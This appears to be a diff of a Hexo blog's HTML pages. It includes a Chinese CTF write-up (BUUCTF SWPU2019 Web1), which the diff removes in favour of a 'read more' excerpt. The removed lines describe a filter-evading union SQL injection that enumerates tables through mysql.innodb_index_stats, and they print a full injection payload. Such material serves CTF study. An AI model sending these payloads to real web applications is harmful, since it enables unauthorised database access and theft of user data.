@@ -140,7 +140,7 @@
     <div class="article-entry" itemprop="articleBody">
        
   <h1 id="This-Is-A-New-Beginning"><a href="#This-Is-A-New-Beginning" class="headerlink" title="This Is A New Beginning"></a>This Is A New Beginning</h1><h2 id="一、开场白"><a href="#一、开场白" class="headerlink" title="一、开场白"></a>一、开场白</h2><p>​        花了一个上午搭建而起的博客，gitpage+hexo 两个软件合成在一起，进行自己的学习的记录，记录python人工智能和CTF方向的学习知识，每天记录一点点，每天多学一点点，同时将自己的知识分享给大家，可以让大家一起少走一些弯路，如果有错的，不同的想法，请大家在评论区给出。后面将开通账号的注册功能，搭建一个论坛的系统。 <strong>for study</strong></p>
-<h1 id="二、分享"><a href="#二、分享" class="headerlink" title="二、分享"></a>二、分享</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/crawler-splj2/ggs6sg">CTF-WEB</a></p>
+<h1 id="二、分享曾经经验"><a href="#二、分享曾经经验" class="headerlink" title="二、分享曾经经验"></a>二、分享曾经经验</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/crawler-splj2/ggs6sg">CTF-WEB</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/crawler-splj2/ggs6sg">BUUCTF</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/crawler-splj2/rgxure">MISC</a></p>
  
@@ -197,41 +197,11 @@
        
   <h1 id="Buu刷题记"><a href="#Buu刷题记" class="headerlink" title="Buu刷题记"></a>Buu刷题记</h1><h2 id="一、题目打开介绍"><a href="#一、题目打开介绍" class="headerlink" title="一、题目打开介绍"></a>一、题目打开介绍</h2><p><img src="https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png" alt="image-20200913095530231.png">这是题目本身打开的样子，继续进入题目</p>
 <h2 id="二、做题"><a href="#二、做题" class="headerlink" title="二、做题"></a>二、做题</h2><p><img src="https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png" alt="image-20200913095634097.png"></p>
-<p>简单的登陆界面和注册界面，没有sql注入<strong>已经尝试</strong></p>
-<p><img src="https://i.loli.net/2020/09/13/cfFtN41xLoAQEjO.png" alt="image-20200913095733239.png"></p>
-<p>申请发布广告</p>
-<p><img src="https://i.loli.net/2020/09/13/sOEZrzKgn2LqU5t.png" alt="image-20200913095759770.png"></p>
-<p>习惯性的测试</p>
-<p><img src="https://i.loli.net/2020/09/13/vDZlT7YSPexgVrJ.png" alt="image-20200913095857022.png"></p>
-<p>然后开始尝试注入，抓包，</p>
-<p><img src="https://i.loli.net/2020/09/13/RjvFaOTiMcZuBgG.png" alt="image-20200913095931186.png"><br><img src="https://i.loli.net/2020/09/13/eZLKpvNyosAEJnP.png" alt="image-20200913095944857.png"></p>
-<p>两个都要，经过union注入判断列数，发现是22列</p>
-<p>然后收集信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database() web1</span><br><span class="line">version() 10.2.26-MariaDB-log</span><br></pre></td></tr></table></figure>
-
-<p>然后开始使用<strong>information</strong>库进行爆表，爆字段<br><img src="https://i.loli.net/2020/09/13/6fwnvVYWotsuXDS.png" alt="image-20200913100124933.png"></p>
-<p>然后没有用，再加上一下字符被毁掉</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and or updatexml 空格</span><br></pre></td></tr></table></figure>
-
-<p>用/**/代替空格，然后继续解决无法爆出表的问题</p>
-<p>经过百度发现还有一个表可以爆出表名</p>
-<p><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_index_stats/">https://mariadb.com/kb/en/mysqlinnodb_index_stats/</a></p>
-<p>就是上面这个库，然后开始继续操作就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tables() FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br></pre></td></tr></table></figure>
-
-<p>这就是已经取得的数据。</p>
-<p>下面解决无法爆字段的问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure>
-
-<p>如果直接使用这个命令的·话，他会返回多条数据然后并且报错，并且我们现在无法知道字段名，必须再想其他的办法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以造出临时表，字段名分别可以知道了<strong>需要猜一下字段数</strong></p>
-<p>最后 payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;-1&#39;and&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;&amp;content&#x3D;a&amp;ac&#x3D;add</span><br></pre></td></tr></table></figure>
-
-<p>这里有两个注意的点</p>
-<h3 id="1-临时表再次使用时必须要有一个别名"><a href="#1-临时表再次使用时必须要有一个别名" class="headerlink" title="1.临时表再次使用时必须要有一个别名"></a>1.临时表再次使用时必须要有一个别名</h3><h3 id="2-记得带括号"><a href="#2-记得带括号" class="headerlink" title="2.记得带括号"></a>2.记得带括号</h3><h3 id="3-数字不能做字段名"><a href="#3-数字不能做字段名" class="headerlink" title="3.数字不能做字段名"></a>3.数字不能做字段名</h3> 
+<p>简单的登陆界面和注册界面，没有sql注入<strong>已经尝试</strong></p> 
+      <a class="article-more-link" href="/2020/09/13/SWPU2019-Web1/"
+        >阅读更多...</a
+      >
+       
       <!-- reward -->
       
     </div>
